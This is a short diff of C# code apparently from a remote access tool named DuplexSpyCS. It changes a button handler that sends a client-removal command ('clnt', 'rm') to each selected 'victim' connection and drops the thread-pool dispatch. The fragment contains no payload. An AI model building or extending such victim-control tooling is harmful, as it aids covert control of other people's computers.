@@ -79,15 +79,13 @@ namespace DuplexSpyCS
         //GO
         private void button3_Click(object sender, EventArgs e)
         {
-            int nThd = (int)numericUpDown1.Value;
-            ThreadPool.SetMinThreads(1, 1);
-            ThreadPool.SetMaxThreads(nThd, nThd);
             foreach (ListViewItem item in listView1.CheckedItems)
             {
                 clsVictim v = (clsVictim)item.Tag;
-                ThreadPool.QueueUserWorkItem(x =>
+                v.fnSendCommand(new string[]
                 {
-                    v.SendCommand("clnt|rm");
+                    "clnt",
+                    "rm",
                 });
             }
         }
